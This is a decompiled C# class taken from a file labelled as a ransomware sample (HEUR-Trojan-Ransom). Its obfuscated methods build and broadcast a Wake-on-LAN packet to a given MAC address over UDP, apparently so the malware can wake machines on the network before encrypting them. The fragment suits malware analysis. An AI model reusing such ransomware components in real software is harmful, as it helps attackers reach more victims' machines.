// Decompiled with JetBrains decompiler
// Type: MufMaOSvGyvz.OwlpRzDmPpi
// Assembly: Final-02.exe, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: C3A0FEE4-03D5-43E6-BB9B-FAFC16FEF04E
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.01-msil\HEUR-Trojan-Ransom.Win32.Generic-6a5090762c6058bc223e37e89f53832faad80995e3c5ed7e59ed9f5a5e604e47.exe

using System;
using System.Net;
using System.Net.Sockets;

namespace MufMaOSvGyvz
{
  public static class OwlpRzDmPpi
  {
    public static void KXPzXivlwAnerFl(string string_0, string string_1, string string_2)
    {
      UdpClient udpClient = new UdpClient();
      byte[] dgram = new byte[102];
      for (int index = 0; index <= 5; ++index)
        dgram[index] = byte.MaxValue;
      string[] strArray;
      if (string_0.Contains("-"))
        strArray = string_0.Split('-');
      else
        strArray = string_0.Split(':');
      if (strArray.Length != 6)
        throw new ArgumentException("Incorrect MAC address supplied!");
      int num = 6;
      for (int index1 = 0; index1 < 16; ++index1)
      {
        for (int index2 = 0; index2 < 6; ++index2)
          dgram[num + index1 * 6 + index2] = (byte) Convert.ToInt32(strArray[index2], 16);
      }
      IPAddress broadcastAddress = IPAddress.Parse(string_1).GetBroadcastAddress(IPAddress.Parse(string_2));
      udpClient.Send(dgram, dgram.Length, broadcastAddress.ToString(), 3);
    }

    public static IPAddress GetBroadcastAddress(
      this IPAddress ipaddress_0,
      IPAddress ipaddress_1)
    {
      byte[] addressBytes1 = ipaddress_0.GetAddressBytes();
      byte[] addressBytes2 = ipaddress_1.GetAddressBytes();
      if (addressBytes1.Length != addressBytes2.Length)
        throw new ArgumentException("Lengths of IP address and subnet mask do not match.");
      byte[] address = new byte[addressBytes1.Length];
      for (int index = 0; index < address.Length; ++index)
        address[index] = (byte) ((uint) addressBytes1[index] | (uint) addressBytes2[index] ^ (uint) byte.MaxValue);
      return new IPAddress(address);
    }
  }
}
